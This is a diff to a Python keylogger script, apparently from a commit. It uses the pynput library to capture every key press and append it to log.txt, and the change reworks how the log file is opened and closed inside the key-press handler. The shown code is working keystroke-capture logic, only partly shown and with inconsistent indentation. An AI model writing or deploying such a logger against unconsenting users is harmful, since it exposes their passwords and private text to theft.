@@ -1,15 +1,16 @@
 #!/usr/bin/env python
 from pynput import keyboard
 
-LOG = 'log.txt'
-
 
 def on_press(key):
     try:
+    	logfile = open('log.txt', 'a')
     	logfile.write('{0}'.format(key.char))
+    	logfile.close()
         #print('alphanumeric key {0} pressed'.format(
         #    key.char))
     except AttributeError:
+        logfile = open('log.txt', 'a')
         if(format(key) == 'Key.space'):
             logfile.write(' ')
         elif(format(key) == 'Key.enter'):
@@ -68,6 +69,7 @@ def on_press(key):
             pass
         else:
         	logfile.write(' {0} '.format(key))
+        logfile.close()
 
 #def on_release(key):
     #print('{0} released'.format(
@@ -90,5 +92,4 @@ def board():
 
 
 if __name__ == '__main__':
-	logfile = open(LOG, 'a')
 	board()
